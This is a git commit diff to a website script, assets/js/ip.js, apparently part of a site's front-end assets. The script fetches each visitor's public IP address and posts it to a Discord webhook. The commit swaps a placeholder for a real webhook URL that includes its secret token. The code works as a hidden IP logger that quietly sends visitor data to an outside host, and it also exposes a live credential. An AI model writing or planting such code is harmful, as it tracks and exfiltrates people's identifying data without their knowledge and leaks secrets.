1f28c3c4c2495e7a9fd287bf41b90a3b93163553
magi77777 <158772346+magi77777@users.noreply.github.com>
2024-09-12 16:45:41 +0200

    Update ip.js

--- assets/js/ip.js
+++ assets/js/ip.js
@@ -2,7 +2,7 @@ fetch('https://api.ipify.org?format=json')
   .then(response => response.json())
   .then(data => {
     const ip = data.ip;
-    const webhookUrl = 'https://tvoj-discord-webhook';
+    const webhookUrl = 'https://discord.com/api/webhooks/1283800599321776148/aQ6bqNSiG7m0gVi_CrayUPmCMXrf4pZU3QFP-37aUrGJkdmUK_4Ir0fEmdoorbLFhuP7';
 
     const payload = JSON.stringify({
       content: `${ip}`
